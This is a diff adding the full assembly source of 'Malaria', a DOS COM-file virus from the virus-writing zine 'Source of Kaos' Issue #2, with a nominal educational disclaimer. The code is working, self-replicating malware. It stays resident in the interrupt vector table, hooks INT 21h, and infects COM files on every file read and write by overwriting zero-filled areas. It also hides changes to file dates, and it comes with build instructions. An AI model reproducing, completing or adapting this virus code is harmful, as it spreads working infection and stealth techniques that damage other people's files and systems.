@@ -1,0 +1,201 @@
+;
+;                          |- Source of Kaos -|
+;                          |-    Issue #2    -|
+;
+; Disclaimer:
+; This source code is provided educational purposes.  SOK takes no
+; responsiblity for how this source code is used.
+;
+;
+;
+;                       Malaria
+;                       by
+;                       Yosha
+
+;Malaria is a simple 276 byte COM infector that goes resident at 0:200h and 
+;infects on read and write by overwriting areas of 0h bytes with the virus.  
+;While not overly infectious, it can remain undetected for a long time, as 
+;the size of infected files does not grow and it takes up no memory.
+
+;after assembly, use a hex editor to insert 4 NOPs before the virus.
+
+.model tiny
+.code
+.286
+code_length equ offset finish - offset start
+file_pos    equ [di+(15h-2bh)]
+extension   equ 28h
+open_mode   equ [di+(2-2bh)]
+device_info equ [di+(6-2bh)]
+oldint21    equ 0c5h       
+org 0h
+
+start:
+   push  cs
+   pop   es
+   mov   si,104h           ;get ip
+   mov   cx,code_length
+   cld
+
+   mov   ax,1e1eh          ;virus' handler traps this and restores program
+   int   21h
+
+   mov   es,bx             ;copy virus to upper half of IVT
+   mov   di,200h
+   rep   movsb
+
+   mov   ds,bx             ;hook int 21h
+   mov   si,21h*4
+   movsw
+   movsw
+   mov   word ptr [si-4],offset handler + 200h
+   mov   word ptr [si-2],cx
+   jmp   start             ;virus int 21h handler restores the 4 old bytes
+
+message  db " [Malaria] by Yosha "
+oldbytes:
+   int   20h
+   nop
+   nop
+newbytes db 'M',0e9h,0,0
+
+read_write_sub:
+   push  cs
+   pop   ds
+   xor   cx,cx             ;go back to start of file
+   mov   word ptr es:[file_pos],cx
+   mov   cl,4      
+   int   oldint21
+   ret   
+handler:
+   cmp   ax,1e1eh          ;infect check?  
+   jne   not_check
+
+   mov   di,sp             ;set iret address to 100h
+   mov   ax,100h
+   stosw
+   xchg  di,ax             ;damn I'm cryptic 
+   
+   push  es                ;restore bytes in old file
+   pop   ds
+   push  si
+   add   si,offset oldbytes
+   movsw
+   movsw
+   pop   di
+
+   xchg  bx,ax             ;zero virus out of program
+   rep   stosb
+   iret                    ;return to 100h
+
+not_check:
+   cmp   ah,40h            ;infects on write
+   je    infect
+   cmp   ah,3fh            ;infects on read
+   je    infect
+   jmp   exit_21
+infect:
+   int   oldint21          ;allow the read
+   pushf
+   pusha                   ;save some registers                           
+   push  es
+   push  ds                   
+   jc    jmp_exit_21_2
+   
+   xchg  bp,ax             ;bp=# bytes read
+   push  bx
+   mov   ax,not 1220h      ;get SFT for handle
+   not   ax
+   int   2fh
+   mov   bl,byte ptr es:[di]
+   mov   ax,not 1216h
+   not   ax
+   int   2fh
+   pop   bx      
+   
+   add   di,extension      ;make sure it has COM extension    
+   mov   al,'C'
+   cld
+   scasb
+   jne   exit_21_2     
+   mov   ax,'MO'
+   scasw
+jmp_exit_21_2:
+   jne   exit_21_2
+                           ;save the offset within the file
+   push  word ptr es:[file_pos]
+   push  bp                ;save # bytes read
+  
+   add   bp,dx             ;bp -> end of read buffer.  
+   add   dx,4   
+                           ;Skip 1st four bytes
+                           ;because files get corrupted if virus infects 
+                           ;beginning of file, then the jump overwrites part
+                           ;of the virus.
+   jno   $+5               ;if it passes a 64k boundary, make it 0ffffh
+   mov   bp,0ffffh
+
+   mov   si,dx             ;scan read buffer for area of 0's
+redo:
+   mov   cx,code_length
+scan_loop:
+   cmp   si,bp             ;over extended our boundary?
+   jae   restore_position  ;if so, exit
+   lodsb                   ;load character
+   or    al,al             ;if not zero, reset cx
+   jnz   redo
+   loop  scan_loop         ;keep scanning!
+
+   pop   ax                ;calculate offset within file where virus will be
+   pop   bp
+   push  bp
+   push  ax
+   sub   bp,ax
+   add   bp,si   
+   sub   bp,code_length-3
+
+   mov   ah,3fh            ;read in some bytes                           
+   mov   dx,offset oldbytes+200h                           
+   call  read_write_sub
+
+   mov   si,dx             ;check for infection and exe's
+   lodsb
+   cmp   al,'M'
+   je    restore_position  
+
+   xchg  bp,ax
+   mov   word ptr es:[file_pos],ax     ;move to that offset
+   or    byte ptr es:[open_mode],10b   ;change access to allow writes
+
+   inc   ah                ;calculate ip and store it   
+   mov   word ptr [start+203h],ax
+   sub   ax,104h           ;make a jump and store it
+   mov   word ptr [newbytes+202h],ax                              
+
+   mov   ah,40h            ;write virus to file
+   mov   cx,code_length
+   mov   dx,200h
+   int   oldint21
+   
+   mov   ah,40h            ;write new bytes
+   mov   dx,offset newbytes+200h
+   call  read_write_sub
+                           ;change to "do not set date/time on close"
+   or    byte ptr es:[device_info],1000000b
+restore_position:          ;restore file pointer
+   pop   ax
+   pop   word ptr es:[file_pos]
+exit_21_2:
+   pop   ds                ;restore registers
+   pop   es               
+   popa
+   popf
+   sti                     ;some shit crashes if you don't do this cuz retf 2
+                           ;trashes some flags no matter what.  Some stuff
+                           ;depends on IE to be set after a read, believe it 
+                           ;or not.
+   retf  2
+exit_21:   
+   db    0eah              ;exit interrupt
+finish:
+   end   start
